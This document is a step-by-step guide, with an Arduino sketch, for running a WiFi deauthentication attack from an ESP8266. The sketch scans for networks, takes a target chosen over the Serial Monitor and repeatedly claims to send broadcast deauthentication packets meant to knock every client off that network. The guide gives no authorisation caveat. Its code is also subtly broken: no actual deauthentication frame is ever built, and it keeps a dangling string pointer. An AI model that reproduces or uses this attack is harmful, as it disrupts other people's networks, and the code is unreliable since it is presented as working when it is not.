
# ESP8266 Deauthentication Attack via Serial Monitor

This guide explains how to perform a deauthentication attack using an ESP8266 and the Arduino IDE, with network selection via the Serial Monitor.

## Requirements

- ESP8266 board (e.g., NodeMCU)
- Arduino IDE
- USB cable to connect the ESP8266 to your computer

## Setup

1. **Install the ESP8266 Board in Arduino IDE**:
   - Open the Arduino IDE.
   - Go to `File` > `Preferences`.
   - In the "Additional Board Manager URLs" field, add: `http://arduino.esp8266.com/stable/package_esp8266com_index.json`
   - Go to `Tools` > `Board` > `Boards Manager`.
   - Search for "esp8266" and install the board package.

2. **Select the Correct Board and Port**:
   - Go to `Tools` > `Board` and select your ESP8266 board (e.g., `NodeMCU 1.0 (ESP-12E Module)`).
   - Go to `Tools` > `Port` and select the correct port for your ESP8266.

3. **Upload the Code**:
   - Copy the provided code into a new sketch in the Arduino IDE.
   - Upload the sketch to your ESP8266.

## Code

```cpp
#include <ESP8266WiFi.h>

void setup() {
  Serial.begin(115200);
  delay(10);

  // Start WiFi in station mode to scan for networks
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  // Scan for available networks
  int n = WiFi.scanNetworks();
  Serial.println("Scan done");
  if (n == 0) {
    Serial.println("No networks found");
  } else {
    Serial.print(n);
    Serial.println(" networks found");
    for (int i = 0; i < n; ++i) {
      // Print SSID and RSSI for each network
      Serial.print(i + 1);
      Serial.print(": ");
      Serial.print(WiFi.SSID(i));
      Serial.print(" (");
      Serial.print(WiFi.RSSI(i));
      Serial.print(")");
      Serial.println((WiFi.encryptionType(i) == ENC_TYPE_NONE) ? " " : "*");
      delay(10);
    }

    // Wait for user to select a network
    Serial.println("Enter the number of the network you want to target:");
    while (!Serial.available()) {
      delay(100);
    }
    int targetIndex = Serial.parseInt();
    if (targetIndex > 0 && targetIndex <= n) {
      const char* targetSSID = WiFi.SSID(targetIndex - 1).c_str();
      Serial.print("Targeting network: ");
      Serial.println(targetSSID);

      // Send deauthentication packets to the broadcast address
      uint8_t broadcasting[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      WiFi.begin(targetSSID);
      WiFi.sendPacket(broadcasting, 24, true);

      delay(1000); // Wait for 1 second before sending the next packet
    } else {
      Serial.println("Invalid selection");
    }
  }
}

void loop() {
  // Send deauthentication packets to the broadcast address
  uint8_t broadcasting[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  WiFi.sendPacket(broadcasting, 24, true);

  delay(1000); // Wait for 1 second before sending the next packet
}

```
Usage
1. Open the Serial Monitor:

2. After uploading the code, open the Serial Monitor in the Arduino IDE.
   Set the baud rate to 115200 to match the Serial.begin(115200) speed in the code.
   Scan for Networks:

3. Power on your ESP8266. It will scan for available WiFi networks and print the results to the Serial Monitor.
   You will see a list of networks with their SSIDs and signal strengths. Networks with encryption will be marked with an asterisk (*).
   Select a Target Network:

4. Enter the number corresponding to the network you want to target in the Serial Monitor and press Enter.
   For example, if you want to target the second network in the list, enter 2 and press Enter.
   Perform Deauth Attack:

5. The ESP8266 will send deauthentication packets to the broadcast address of the selected network, disrupting all clients connected to that network.
   Example Output
```
Scan done
5 networks found
1: network1 (-45)
2: network2 (-50)*
3: network3 (-60)
4: network4 (-70)*
5: network5 (-80)
Enter the number of the network you want to target:
Targeting network: network2
```
Notes
Ensure your ESP8266 has a stable power supply, as sending continuous deauth packets can increase power consumption.
The effectiveness of the attack depends on the range and signal strength of the ESP8266. It might not disrupt devices that are too far from the ESP8266.
Other WiFi networks in the vicinity might interfere with the attack, reducing its effectiveness.

